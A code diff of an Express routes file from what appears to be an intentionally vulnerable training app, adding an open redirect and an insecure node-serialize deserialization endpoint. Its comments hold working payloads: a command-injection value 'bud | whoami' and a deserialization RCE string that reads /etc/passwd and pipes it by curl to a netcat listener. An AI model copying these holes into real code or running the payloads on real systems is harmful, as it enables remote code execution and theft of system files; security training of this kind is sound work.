@@ -5,8 +5,8 @@ module.exports = (app,db) => {
     //Get System/ warehouse information
     /**
      * GET /v1/status/{brand}
-     * @summary check if brand website is available through curl (rce)
-     * @Author command execution - brand="bud | whoami"
+     * @summary Check if brand website is available through curl (RCE - Remote Code Execution)
+     * @description command execution - brand="bud | whoami"
      * @tags system
      * @param {string} brand.path.required - the beer brand you want to test
      */
@@ -22,6 +22,24 @@ module.exports = (app,db) => {
         }
         
     });
+        //redirect user to brand
+    /**
+     * GET /v1/redirect/
+     * @summary Redirect the user the beer brand website (Insecure redirect)
+     * @Author 
+     * @tags system
+     * @param {string} url.query.required - the beer brand you want to redirect to
+     */
+     app.get('/v1/redirect/', (req,res) =>{
+    var url = req.query.url
+    console.log(url)
+    if(url){
+        res.redirect(url);
+    } else{
+        next()
+    }
+        
+    });
     //initialize list of beers
     /**
      * POST /v1/init/
@@ -29,27 +47,22 @@ module.exports = (app,db) => {
      * @description 
             {"rce":"_$$ND_FUNC$$_function ()
             {require('child_process').exec(
-            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- 180.256.0.88:4444\"',
+            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- localhost:4444\"',
             function(error, stdout, stderr)
             {console.log(stdout) }
             );} () "}
 
 
             netcat -l 4444
-     * @Author command execution - brand="bud | whoami"
+     * @Author Insecure Object Deserialization
      * @tags system
-     * @param {string} brand.path.required - the beer brand you want to test
+     * @param {object} request.body.required - the beer brand you want to test
      */
-     app.get('/v1/status/:brand', (req,res) =>{
-        var execSync = require('child_process').execSync;
-
-        try{
-            const test = execSync("curl https://letmegooglethat.com/?q="+ req.params.brand)
-            res.send(test)
-        }
-        catch (e){
-            console.log(e)
-        }
+     app.post('/v1/init', (req,res) =>{
+        var serialize = require('node-serialize');
+        const body = req.body.object;
+        var deser = serialize.unserialize(body)
+        console.log(deser)
         
     });
 };
